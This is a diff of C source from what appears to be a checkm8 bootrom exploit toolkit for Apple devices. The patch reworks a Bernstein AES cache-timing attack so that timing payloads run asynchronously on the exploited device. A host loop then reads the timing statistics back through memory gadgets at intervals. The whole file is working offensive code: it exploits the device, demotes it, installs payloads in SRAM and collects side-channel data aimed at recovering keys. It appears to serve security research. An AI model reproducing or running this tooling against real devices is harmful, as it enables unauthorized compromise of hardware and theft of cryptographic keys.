@@ -4,17 +4,20 @@
 #include <string.h>
 #include <stdlib.h>
 #include <math.h>
+#include <unistd.h>
+#include <zconf.h>
 
 #include "command.h"
 #include "payload.h"
 #include "usb_helpers.h"
+#include "bootrom_addr.h"
+#include "bootrom_type.h"
 
 #ifdef CHECKM8_LOGGING
 
 #include <stdarg.h>
 #include <execinfo.h>
 #include <stdlib.h>
-#include <time.h>
 
 #endif
 
@@ -160,6 +163,7 @@ struct aes_pointers
 
 struct aes_pointers *install_aes_data(struct pwned_device *dev)
 {
+    int close;
     struct aes_pointers *res = malloc(sizeof(struct aes_pointers));
 
     unsigned char sbox[256] =
@@ -224,11 +228,16 @@ struct aes_pointers *install_aes_data(struct pwned_device *dev)
                     0x0b, 0x08, 0x0d, 0x0e, 0x07, 0x04, 0x01, 0x02, 0x13, 0x10, 0x15, 0x16, 0x1f, 0x1c, 0x19, 0x1a
             };
 
-    if(IS_CHECKM8_FAIL(open_device_session(dev)))
+    if(is_device_session_open(dev)) close = 0;
+    else
     {
-        printf("failed to open device session\n");
-        free(res);
-        return NULL;
+        close = 1;
+        if(IS_CHECKM8_FAIL(open_device_session(dev)))
+        {
+            printf("failed to open device session\n");
+            free(res);
+            return NULL;
+        }
     }
 
     res->addr_sbox = install_data(dev, SRAM, sbox, 256);
@@ -263,11 +272,14 @@ struct aes_pointers *install_aes_data(struct pwned_device *dev)
         return NULL;
     }
 
-    if(IS_CHECKM8_FAIL(close_device_session(dev)))
+    if(close)
     {
-        printf("failed to close device session\n");
-        free(res);
-        return NULL;
+        if(IS_CHECKM8_FAIL(close_device_session(dev)))
+        {
+            printf("failed to close device session\n");
+            free(res);
+            return NULL;
+        }
     }
 
     return res;
@@ -351,58 +363,52 @@ void aes_sw(struct pwned_device *dev)
     close_device_session(dev);
 }
 
-void aes_sw_bernstein(struct pwned_device *dev)
+DEV_PTR_T aes_sw_bernstein(struct pwned_device *dev)
 {
-    int i, j;
-    double timing;
-
-    double packets = 0;
-    double ttotal = 0;
-    double t[16][256] = {0};
-    double tsq[16][256] = {0};
-    long long tnum[16][256] = {0};
-    double u[16][256] = {0};
-    double udev[16][256] = {0};
-
     DEV_PTR_T addr_data, addr_key, addr_async_buf;
+
     unsigned char data[16];
     unsigned char key[16];
+    memset(key, 0, 16);
 
-    for(j = 0; j < 16; j++)
-        key[j] = random();
+    if(IS_CHECKM8_FAIL(open_device_session(dev)))
+    {
+        printf("failed to open device session\n");
+        return DEV_PTR_NULL;
+    }
 
     struct dev_cmd_resp *resp;
     struct aes_pointers *ptrs = install_aes_data(dev);
     if(ptrs == NULL)
     {
         printf("failed to install aes constants\n");
-        return;
+        return DEV_PTR_NULL;
     }
 
     addr_data = install_data(dev, SRAM, data, 16);
     if(addr_data == DEV_PTR_NULL)
     {
         printf("failed to install aes data\n");
-        return;
+        return DEV_PTR_NULL;
     }
 
     addr_key = install_data(dev, SRAM, key, 16);
     if(addr_key == DEV_PTR_NULL)
     {
         printf("failed to install aes key\n");
-        return;
+        return DEV_PTR_NULL;
     }
 
     if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_SYNC, SRAM)))
     {
         printf("failed to install sync payload\n");
-        return;
+        return DEV_PTR_NULL;
     }
 
     if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_AES_SW, SRAM)))
     {
         printf("failed to install aes payload\n");
-        return;
+        return DEV_PTR_NULL;
     }
 
     resp = execute_payload(dev, PAYLOAD_SYNC, 0, 0);
@@ -410,79 +416,24 @@ void aes_sw_bernstein(struct pwned_device *dev)
     {
         printf("failed to execute sync payload\n");
         free_dev_cmd_resp(resp);
-        return;
+        return DEV_PTR_NULL;
     }
     free_dev_cmd_resp(resp);
 
-    addr_async_buf = setup_payload_async(dev, PAYLOAD_AES_SW, 32,
-            7, addr_data, 16, addr_key,
-            ptrs->addr_sbox, ptrs->addr_rc, ptrs->addr_mul2, ptrs->addr_mul3);
+    addr_async_buf = setup_payload_async(dev, PAYLOAD_AES_SW,
+                                         sizeof(struct aes_sw_bernstein_data),
+                                         7, addr_data, 16, addr_key,
+                                         ptrs->addr_sbox, ptrs->addr_rc, ptrs->addr_mul2, ptrs->addr_mul3);
     run_payload_async(dev, PAYLOAD_AES_SW);
-    close_device_session(dev);
 
-
-    for(i = 0; i < 1000000; i++)
+    if(IS_CHECKM8_FAIL(close_device_session(dev)))
     {
-        for(j = 0; j < 16; j++)
-            data[j] = random();
-
-        resp = write_gadget(dev, addr_data, data, 16);
-        if(IS_CHECKM8_FAIL(resp->ret))
-        {
-            printf("failed to update data\n");
-            return;
-        }
-        free_dev_cmd_resp(resp);
-
-        resp = execute_payload(dev, PAYLOAD_AES_SW, 0, 7,
-                               addr_data, 16, addr_key,
-                               ptrs->addr_sbox, ptrs->addr_rc, ptrs->addr_mul2, ptrs->addr_mul3);
-        if(IS_CHECKM8_FAIL(resp->ret))
-        {
-            printf("failed to execute sw AES payload\n");
-            free_dev_cmd_resp(resp);
-            return;
-        }
-
-        timing = (double) resp->retval;
-        printf("%i) -> got timing %f\n", i, timing);
-        free_dev_cmd_resp(resp);
-
-        for(j = 0; j < 16; j++)
-        {
-            ++packets;
-            ttotal += timing;
-            t[j][data[j]] += timing;
-            tsq[j][data[j]] += timing * timing;
-            tnum[j][data[j]] += 1;
-        }
+        printf("failed to close device session\n");
+        return DEV_PTR_NULL;
     }
 
-    for(i = 0; i < 16; i++)
-    {
-        for(j = 0; j < 256; j++)
-        {
-            u[i][j] = t[i][j] / tnum[i][j];
-            udev[i][j] = tsq[i][j] / tnum[i][j];
-            udev[i][j] -= u[i][j] * u[i][j];
-            udev[i][j] = sqrt(udev[i][j]);
-        }
-    }
-
-    for(i = 0; i < 16; i++)
-    {
-        for(j = 0; j < 256; j++)
-        {
-            printf("%2d %4d %3d %lld %.3f %.3f %.3f %.3f\n",
-                    i, 16, j, tnum[i][j], u[i][j], udev[i][j],
-                   u[i][j] - (ttotal / packets), udev[i][j] / sqrt(tnum[i][j])
-            );
-        }
-    }
-
-    uninstall_all_payloads(dev);
-    uninstall_all_data(dev);
     free(ptrs);
+    return addr_async_buf;
 }
 
 void usb_task_exit(struct pwned_device *dev)
@@ -539,7 +490,15 @@ void usb_task_exit(struct pwned_device *dev)
 int main()
 {
     struct dev_cmd_resp *resp;
+    struct aes_sw_bernstein_data *data;
     struct pwned_device *dev = exploit_device();
+    DEV_PTR_T addr_async_buf;
+
+    int j, b;
+    double u[16][256];
+    double udev[16][256];
+    double taverage;
+
     if(dev == NULL || dev->status == DEV_NORMAL)
     {
         printf("Failed to exploit device\n");
@@ -549,7 +508,84 @@ int main()
     fix_heap(dev);
     demote_device(dev);
 
-    aes_sw_bernstein(dev);
+    addr_async_buf = aes_sw_bernstein(dev);
+    printf("got async buf ptr %llx\n", addr_async_buf);
+    if(addr_async_buf == DEV_PTR_NULL)
+    {
+        return -1;
+    }
+
+    while(1)
+    {
+        sleep(15);
+        if(IS_CHECKM8_FAIL(open_device_session(dev)))
+        {
+            printf("failed to open device session");
+            return -1;
+        }
+
+        resp = execute_gadget(dev, ADDR_EVENT_NOTIFY, 0, 1,
+                              addr_async_buf + offsetof(struct aes_sw_bernstein_data, ev_data));
+        if(IS_CHECKM8_FAIL(resp->ret))
+        {
+            printf("failed to signal for data\n");
+            free_dev_cmd_resp(resp);
+            return -1;
+        }
+
+        free_dev_cmd_resp(resp);
+        resp = read_gadget(dev, addr_async_buf, sizeof(struct aes_sw_bernstein_data));
+        if(IS_CHECKM8_FAIL(resp->ret))
+        {
+            printf("failed to get data from device\n");
+            free_dev_cmd_resp(resp);
+            return -1;
+        }
+
+        data = (struct aes_sw_bernstein_data *) resp->data;
+        printf("have count %lli\n", data->count);
+
+        taverage = data->ttotal / (double) data->count;
+        for(j = 0; j < 16; j++)
+        {
+            for(b = 0; b < 256; b++)
+            {
+                u[j][b] = data->t[j][b] / data->tnum[j][b];
+                udev[j][b] = data->tsq[j][b] / data->tnum[j][b];
+                udev[j][b] -= u[j][b] * u[j][b];
+                udev[j][b] = sqrt(udev[j][b]);
+            }
+        }
+
+        for(j = 0; j < 16; j++)
+        {
+            for(b = 0; b < 256; b++)
+            {
+                printf("%2d %3d %lli %.3f %.3f %.3f %.3f\n",
+                       j, b, (long long) data->tnum[j][b],
+                       u[j][b], udev[j][b],
+                       u[j][b] - taverage, udev[j][b] / sqrt(data->tnum[j][b])
+                );
+            }
+        }
+
+        free_dev_cmd_resp(resp);
+        resp = execute_gadget(dev, ADDR_EVENT_NOTIFY, 0, 1,
+                              addr_async_buf + offsetof(struct aes_sw_bernstein_data, ev_done));
+        if(IS_CHECKM8_FAIL(resp->ret))
+        {
+            printf("failed to signal data end\n");
+            free_dev_cmd_resp(resp);
+            return -1;
+        }
+
+        free_dev_cmd_resp(resp);
+        if(IS_CHECKM8_FAIL(close_device_session(dev)))
+        {
+            printf("failed to close device session\n");
+            return -1;
+        }
+    }
 
     free_device(dev);
 }
